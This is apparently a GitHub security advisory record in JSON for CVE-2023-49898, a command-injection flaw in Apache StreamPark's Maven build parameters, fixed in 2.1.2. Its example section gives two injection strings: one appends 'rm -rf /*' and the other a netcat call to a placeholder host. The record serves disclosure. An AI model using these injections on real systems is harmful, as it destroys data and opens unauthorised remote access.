{
  "id": "GHSA-qg44-xqwj-wc28",
  "summary": "Apache StreamPark: Authenticated system users could trigger remote command execution",
  "details": "In streampark, there is a project module that integrates Maven's compilation capability. However, there is no check on the compilation parameters of Maven. allowing attackers to insert commands for remote command execution, The prerequisite for a successful attack is that the user needs to log in to the streampark system and have system-level permissions. Generally, only users of that system have the authorization to log in, and users would not manually input a dangerous operation command. Therefore, the risk level of this vulnerability is very low.\n\nMitigation:\n\nall users\u00a0should upgrade to 2.1.2\n\nExample:\n\n##You can customize the splicing method according to the compilation situation of the project, mvn compilation results use &&, compilation failure use \"||\" or \"&&\":\n\n/usr/share/java/maven-3/conf/settings.xml || rm -rf /*\n\n/usr/share/java/maven-3/conf/settings.xml && nohup nc x.x.x.x 8899 &\n\n",
  "aliases": [
    "CVE-2023-49898"
  ],
  "modified": "2024-02-16T08:19:49.746879Z",
  "published": "2023-12-15T15:30:27Z",
  "database_specific": {
    "nvd_published_at": "2023-12-15T13:15:07Z",
    "cwe_ids": [
      "CWE-77"
    ],
    "severity": "CRITICAL",
    "github_reviewed": true,
    "github_reviewed_at": "2023-12-16T00:46:50Z"
  },
  "references": [
    {
      "type": "ADVISORY",
      "url": "https://nvd.nist.gov/vuln/detail/CVE-2023-49898"
    },
    {
      "type": "PACKAGE",
      "url": "https://github.com/apache/incubator-streampark"
    },
    {
      "type": "WEB",
      "url": "https://lists.apache.org/thread/qj99c03r4td35f8gbxq084b8qmv2fyr3"
    }
  ],
  "affected": [
    {
      "package": {
        "name": "org.apache.streampark:streampark",
        "ecosystem": "Maven",
        "purl": "pkg:maven/org.apache.streampark/streampark"
      },
      "ranges": [
        {
          "type": "ECOSYSTEM",
          "events": [
            {
              "introduced": "2.0.0"
            },
            {
              "fixed": "2.1.2"
            }
          ]
        }
      ],
      "versions": [
        "2.0.0",
        "2.1.0"
      ],
      "database_specific": {
        "source": "https://github.com/github/advisory-database/blob/main/advisories/github-reviewed/2023/12/GHSA-qg44-xqwj-wc28/GHSA-qg44-xqwj-wc28.json"
      }
    }
  ],
  "schema_version": "1.6.0"
}